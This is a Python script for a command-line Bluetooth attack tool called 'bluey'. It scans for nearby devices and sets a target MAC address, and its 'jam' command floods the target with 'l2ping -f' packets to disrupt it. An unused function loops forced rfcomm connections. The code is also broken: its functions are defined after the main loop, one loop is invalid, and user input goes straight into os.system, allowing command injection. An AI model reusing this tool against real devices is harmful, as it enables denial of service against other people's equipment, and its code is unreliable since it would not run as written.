import os
import bluetooth
import art
import subprocess
from alive_progress import alive_bar
import time


art.tprint("bluey", font="graffiti")
print("\n\n")
print("Author: Logan Goins\n")
print("I am not responsible for any damages or misuse from this software.\nThis software is used at your own risk\n")

while True:
    prompt = "bluey/> "
    print(prompt, end="")

    command = input().split(" ")
    if len(command) >= 3:
        cmd = command[0]
        subcmd = command[1]
        arg = command[2]
        params = [cmd, subcmd, arg]
    elif len(command) >= 2:
        cmd = command[0]
        subcmd = command[1]
        params = [cmd, subcmd]

    elif len(command) >= 1:
        cmd = command[0]
        params = [cmd]


    if(cmd == "scan"):
        scan()

    if(cmd == "set" and subcmd == "target"):
        target = arg
        print(target + "---> target\n")

    if(cmd == "jam"):
        jam()

    if(cmd == "set" and subcmd == "packetsize"):
        packetsize = arg
        print(packetsize + "---> packet size\n")

    if(cmd == "set" and subcmd == "interface"):
        interface = arg
        print(interface + "---> bluetooth interface\n")

    if(cmd == "help"):
        help()

def scan():
    
    nearby_devices = bluetooth.discover_devices(lookup_names=True)
    print("Found {} devices.".format(len(nearby_devices)))

    for addr, name in nearby_devices:
        print("  {} - {}".format(addr, name))


def force_connect():
    print("attempting connection")
    connect=['rfcomm', 'connect', target, '1']
    for x in 1001:
        with alive_bar(x) as bar:
            for i in range(0, 1001):
                subprocess.call(connect)
                bar()

def jam():
    print("Starting packet flow")
    os.system("l2ping -i hci0 -s " + packetsize + " -f " + target)
    
def help():
    print(" \n\n")
    print("Bluey help menu:")
    print("Commands")
    print("--------------------------")
    print("scan  ---  scans for bluetooth devices in the area")
    print("jam  ---  jams bluetooth devices using specified interface, target, and packet size (in bytes)")
    print("set target  --- sets target MAC address for later use")
    print("set interface  ---  sets bluetooth interface for use")
    print("set packetsize  ---  sets packet size for use with the \"jam\" command")
    print(" ")
